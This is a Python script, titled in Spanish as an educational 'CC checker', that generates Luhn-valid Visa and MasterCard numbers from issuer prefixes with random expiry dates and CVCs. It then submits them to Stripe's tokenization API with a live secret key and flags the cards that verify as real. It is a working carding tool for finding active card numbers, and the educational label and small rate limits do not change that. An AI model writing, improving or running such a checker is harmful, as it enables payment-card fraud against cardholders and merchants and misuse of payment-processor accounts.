#!/usr/bin/env python3
"""
CHECKER CC EDUCATIVO - Versión Corregida
Genera EXACTAMENTE 16 dígitos para Visa/MasterCard
"""

import requests
import json
import random
import time
import os
from datetime import datetime
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

class SecureCCChecker:
    def __init__(self):
        self.sk = ""
        self.sk_type = ""  # 'test' o 'live'
        self.generated_cards = []
        self.valid_cards = []
        self.bins = []
        self.session_validations = 0
        self.load_bins()
        
    def load_bins(self):
        """Cargar BINs predefinidos de 6 dígitos"""
        self.bins = [
            # Visa BINs (16 dígitos)
            "411111", "424242", "453201", "491748", "455673", "402400", "448562",
            # MasterCard BINs (16 dígitos)
            "555555", "510510", "520082", "542523", "550692", "530125",
            # Test BINs (16 dígitos)
            "400005", "511151", "522222", "533333", "544444",
        ]
    
    def set_stripe_key(self):
        """Configurar SK con detección automática de tipo"""
        print(f"\n{Fore.CYAN}=== CONFIGURAR STRIPE SECRET KEY ===")
        sk = input("Ingresa tu Stripe Secret Key: ").strip()
        
        if sk.startswith('sk_test_'):
            self.sk = sk
            self.sk_type = 'test'
            self.session_validations = 0
            print(f"{Fore.GREEN}✓ SK de TEST configurado correctamente")
            return True
            
        elif sk.startswith('sk_live_'):
            if not self.show_live_warning():
                return False
            self.sk = sk
            self.sk_type = 'live'
            self.session_validations = 0
            print(f"{Fore.GREEN}✓ SK de LIVE configurado correctamente")
            return True
        else:
            print(f"{Fore.RED}✗ Formato de SK inválido")
            return False
    
    def generate_cc(self, bin_input=None, month=None, year=None):
        """Generar tarjeta con información básica"""
        if bin_input:
            bin_num = bin_input[:6]  # Tomar solo 6 dígitos
        else:
            bin_num = random.choice(self.bins)[:6]
        
        # Generar número de tarjeta (16 dígitos EXACTOS)
        card_number = self.generate_16_digit_card(bin_num)
        
        # Verificar longitud
        if len(card_number) != 16:
            print(f"{Fore.RED}ERROR: Tarjeta generada con {len(card_number)} dígitos")
            # Forzar 16 dígitos
            card_number = card_number[:16].ljust(16, '0')
        
        # Información de la tarjeta
        card_type = "VISA" if card_number.startswith('4') else "MASTERCARD"
        country = "USA" if bin_num in ['411111', '424242', '555555'] else "INTERNATIONAL"
        
        card_data = {
            'number': card_number,
            'exp_month': month or str(random.randint(1, 12)).zfill(2),
            'exp_year': year or str(random.randint(2024, 2028)),
            'cvc': str(random.randint(100, 999)),
            'bin': bin_num,
            'card_type': card_type,
            'country': country,
            'stripe_valid': None,
            'live': False,
            'validation_message': ""
        }
        
        return card_data
    
    def generate_16_digit_card(self, bin_num):
        """Generar número de tarjeta de EXACTAMENTE 16 dígitos"""
        # Asegurar BIN de 6 dígitos
        bin_str = str(bin_num)[:6].ljust(6, '0')
        
        # Generar 9 dígitos aleatorios (6 + 9 = 15 dígitos)
        number = bin_str
        for _ in range(9):
            number += str(random.randint(0, 9))
        
        # Ahora tenemos 15 dígitos, añadir dígito Luhn (total: 16)
        return self.luhn_complete(number)
    
    def luhn_complete(self, number):
        """Completar número con dígito verificador Luhn"""
        # number debe tener 15 dígitos, resultado será 16
        
        def luhn_checksum(card_number):
            total = 0
            reverse_digits = card_number[::-1]
            for i, digit in enumerate(reverse_digits):
                n = int(digit)
                if i % 2 == 1:
                    n *= 2
                    if n > 9:
                        n -= 9
                total += n
            return total % 10
        
        # Calcular dígito de control
        checksum = luhn_checksum(number + '0')
        check_digit = (10 - checksum) % 10
        
        return number + str(check_digit)
    
    def validate_luhn(self, card_number):
        """Validar número de tarjeta con algoritmo Luhn"""
        if len(card_number) != 16:
            return False
            
        total = 0
        reverse_digits = card_number[::-1]
        for i, digit in enumerate(reverse_digits):
            n = int(digit)
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
        
        return total % 10 == 0
    
    def generate_multiple_cc(self):
        """Generar múltiples tarjetas"""
        print(f"\n{Fore.CYAN}=== GENERAR TARJETAS ===")
        
        try:
            max_limit = 100 if self.sk_type == 'test' else 20
            count = int(input(f"¿Cuántas tarjetas generar? (1-{max_limit}): "))
            
            if count < 1 or count > max_limit:
                print(f"{Fore.RED}✗ El número debe estar entre 1 y {max_limit}")
                return
            
            print(f"\n{Fore.YELLOW}Opciones de generación:")
            print(f"{Fore.WHITE}1. BIN aleatorio")
            print(f"{Fore.WHITE}2. BIN específico")
            bin_choice = input("Selecciona opción (1/2): ")
            
            bin_input = None
            if bin_choice == "2":
                bin_input = input("Ingresa BIN (6 dígitos): ")
                if len(bin_input) != 6 or not bin_input.isdigit():
                    print(f"{Fore.RED}✗ BIN inválido. Debe tener 6 dígitos.")
                    return
            
            month = input("Mes (MM - dejar vacío para aleatorio): ") or None
            year = input("Año (YYYY - dejar vacío para aleatorio): ") or None
            
            print(f"\n{Fore.YELLOW}Generando {count} tarjetas...")
            print(f"{Fore.CYAN}Verificando longitud (16 dígitos)...")
            
            new_cards = []
            for i in range(count):
                card = self.generate_cc(bin_input, month, year)
                
                # VERIFICACIÓN CRÍTICA
                if len(card['number']) != 16:
                    print(f"{Fore.RED}ERROR: Tarjeta {i+1} tiene {len(card['number'])} dígitos")
                    # Corregir
                    card['number'] = card['number'][:16].ljust(16, '0')
                
                new_cards.append(card)
                
                # Verificar Luhn
                is_valid = self.validate_luhn(card['number'])
                status = f"{Fore.GREEN}✓" if is_valid else f"{Fore.RED}✗"
                
                print(f"{Fore.WHITE}[{i+1}/{count}] {card['number']} | Dígitos: {len(card['number'])} | Luhn: {status}")
            
            self.generated_cards.extend(new_cards)
            print(f"\n{Fore.GREEN}✓ {count} tarjetas generadas (16 dígitos cada una)")
            
        except ValueError:
            print(f"{Fore.RED}✗ Ingresa un número válido")
        except Exception as e:
            print(f"{Fore.RED}✗ Error: {str(e)}")
    
    def test_card_generation(self):
        """Probar generación de tarjetas"""
        print(f"\n{Fore.CYAN}=== PRUEBA DE GENERACIÓN ===")
        print(f"{Fore.YELLOW}Generando 10 tarjetas de prueba...")
        
        test_results = []
        for i in range(10):
            bin_num = random.choice(self.bins)
            card = self.generate_cc(bin_num)
            
            length = len(card['number'])
            is_luhn = self.validate_luhn(card['number'])
            
            result = {
                'bin': bin_num,
                'number': card['number'],
                'length': length,
                'luhn_valid': is_luhn,
                'type': card['card_type']
            }
            test_results.append(result)
            
            length_color = Fore.GREEN if length == 16 else Fore.RED
            luhn_color = Fore.GREEN if is_luhn else Fore.RED
            
            print(f"{i+1:2d}. {bin_num} → {card['number']} | "
                  f"{length_color}{length:2d}d | "
                  f"{luhn_color}{'✓' if is_luhn else '✗'}")
        
        # Estadísticas
        valid_length = sum(1 for r in test_results if r['length'] == 16)
        valid_luhn = sum(1 for r in test_results if r['luhn_valid'])
        
        print(f"\n{Fore.CYAN}=== ESTADÍSTICAS ===")
        print(f"{Fore.WHITE}Total generadas: {len(test_results)}")
        print(f"{Fore.GREEN if valid_length == 10 else Fore.RED}Tarjetas con 16 dígitos: {valid_length}/10")
        print(f"{Fore.GREEN if valid_luhn == 10 else Fore.RED}Tarjetas con Luhn válido: {valid_luhn}/10")
        
        if valid_length != 10:
            print(f"\n{Fore.RED}⚠️  PROBLEMA DETECTADO: Algunas tarjetas no tienen 16 dígitos")
            for r in test_results:
                if r['length'] != 16:
                    print(f"{Fore.YELLOW}  - {r['number']} tiene {r['length']} dígitos")

    # El resto del código permanece igual...
    def safe_validate_cc(self, cc_data):
        """Validación segura con protecciones mejoradas"""
        if not self.sk:
            return False, False, "No SK configurado"
        
        if self.sk_type == 'live' and self.session_validations >= 15:
            return False, False, "Límite de seguridad alcanzado"
        
        if not self.validate_luhn(cc_data['number']):
            return False, False, "INVÁLIDA - Falló algoritmo Luhn"
        
        try:
            headers = {
                'Authorization': f'Bearer {self.sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            data = {
                'card[number]': cc_data['number'],
                'card[exp_month]': cc_data['exp_month'],
                'card[exp_year]': cc_data['exp_year'],
                'card[cvc]': cc_data['cvc']
            }
            
            if self.sk_type == 'live':
                time.sleep(1.5)
            else:
                time.sleep(0.5)
            
            response = requests.post(
                'https://api.stripe.com/v1/tokens',
                headers=headers,
                data=data,
                timeout=10
            )
            
            self.session_validations += 1
            
            if response.status_code == 200:
                if self.sk_type == 'live':
                    return True, True, "LIVE - Tarjeta real verificada"
                else:
                    return True, False, "VÁLIDA - Tarjeta de prueba"
            else:
                return False, False, f"INVÁLIDA - Error {response.status_code}"
                
        except Exception as e:
            return False, False, f"Error: {str(e)}"
    
    def validate_with_protection(self):
        """Validar tarjetas con todas las protecciones"""
        if not self.sk:
            print(f"{Fore.RED}✗ Primero configura el Stripe Secret Key")
            return
        
        if not self.generated_cards:
            print(f"{Fore.RED}✗ No hay tarjetas generadas para validar")
            return
        
        if self.sk_type == 'live':
            remaining = 15 - self.session_validations
            if remaining <= 0:
                print(f"{Fore.RED}✗ Límite de seguridad alcanzado")
                return
            cards_to_validate = self.generated_cards[:remaining]
        else:
            cards_to_validate = self.generated_cards
        
        print(f"\n{Fore.CYAN}=== VALIDANDO {len(cards_to_validate)} TARJETAS ===")
        
        for i, card in enumerate(cards_to_validate, 1):
            print(f"{Fore.WHITE}[{i}/{len(cards_to_validate)}] {card['number']}... ", end="")
            
            is_valid, is_live, message = self.safe_validate_cc(card)
            card['stripe_valid'] = is_valid
            card['live'] = is_live
            card['validation_message'] = message
            
            if is_live:
                print(f"{Fore.GREEN}LIVE ✓")
                self.valid_cards.append(card)
            elif is_valid:
                print(f"{Fore.CYAN}VÁLIDA ✓")
                self.valid_cards.append(card)
            else:
                print(f"{Fore.RED}INVÁLIDA ✗")
    
    def show_generated_cards(self):
        """Mostrar tarjetas"""
        if not self.generated_cards:
            print(f"{Fore.RED}✗ No hay tarjetas generadas")
            return
        
        print(f"\n{Fore.CYAN}=== TARJETAS GENERADAS ({len(self.generated_cards)}) ===")
        for i, card in enumerate(self.generated_cards, 1):
            if card.get('live'):
                color = Fore.GREEN
                status = "LIVE ✓"
            elif card.get('stripe_valid'):
                color = Fore.CYAN
                status = "VÁLIDA ✓"
            elif card.get('stripe_valid') is False:
                color = Fore.RED
                status = "INVÁLIDA ✗"
            else:
                color = Fore.YELLOW
                status = "NO VALIDADA"
            
            print(f"{i}. {color}{card['number']} ({len(card['number'])}d) | "
                  f"{card['exp_month']}/{card['exp_year']} | {card['cvc']} | {status}")

    # Métodos restantes (menú, exportación, etc.)...
    def show_menu(self):
        """Mostrar menú principal"""
        print(f"\n{Fore.CYAN}=== CHECKER CC EDUCATIVO ===")
        print(f"{Fore.YELLOW}1. Configurar Stripe SK")
        print(f"{Fore.YELLOW}2. Generar tarjetas (16 dígitos)")
        print(f"{Fore.YELLOW}3. Validar tarjetas")
        print(f"{Fore.YELLOW}4. Mostrar tarjetas")
        print(f"{Fore.YELLOW}5. Probar generación")
        print(f"{Fore.YELLOW}6. Salir")
        
        return input(f"\n{Fore.GREEN}Selección: ")
    
    def run(self):
        """Ejecutar aplicación"""
        print(f"{Fore.GREEN}=== CHECKER CC - VERSIÓN CORREGIDA ===")
        print(f"{Fore.YELLOW}Genera EXACTAMENTE 16 dígitos")
        
        while True:
            choice = self.show_menu()
            
            if choice == '1':
                self.set_stripe_key()
            elif choice == '2':
                self.generate_multiple_cc()
            elif choice == '3':
                self.validate_with_protection()
            elif choice == '4':
                self.show_generated_cards()
            elif choice == '5':
                self.test_card_generation()
            elif choice == '6':
                print(f"{Fore.GREEN}¡Hasta luego!")
                break
            else:
                print(f"{Fore.RED}Opción inválida")

if __name__ == "__main__":
    checker = SecureCCChecker()
    checker.run()
